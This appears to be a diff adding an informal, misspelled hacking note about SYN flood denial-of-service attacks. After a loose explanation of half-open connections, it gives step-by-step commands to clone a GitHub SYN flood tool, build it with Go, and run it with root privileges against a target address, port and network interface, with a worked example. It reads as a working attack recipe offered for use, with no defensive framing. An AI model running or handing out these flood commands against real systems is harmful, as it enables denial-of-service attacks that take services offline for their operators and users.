@@ -1,0 +1,24 @@
+SYN FLOOD another example of a DDOS methed but i find more effictive, SYN FlOOD attacks
+work all based on flooding servers so much the servers have no time to completely
+processes it through, correctly anyways, likes its normally doses, so theses request 
+that are being sent become incomplet or half open requst do to the lack of being 
+able to keep up with so much its being thrown at, like a humman stressed with too many
+things to do at once we commonly breake down because really hummans are not built for 
+doing 10 million thing at once
+
+Commands
+
+# Clone project:
+git clone https://github.com/rootVIII/gosynflood.git
+
+# Build and run:
+cd <project root>
+go build -o bin/gosynflood
+
+# raw sockets require root privileges when executing:
+sudo ./bin/gosynflood  -t <target IPV4 address> -p <port number> -i <network interface>
+
+# Example:
+sudo ./bin/gosynflood  -t 192.168.1.120 -p 80 -i eth0
+
+
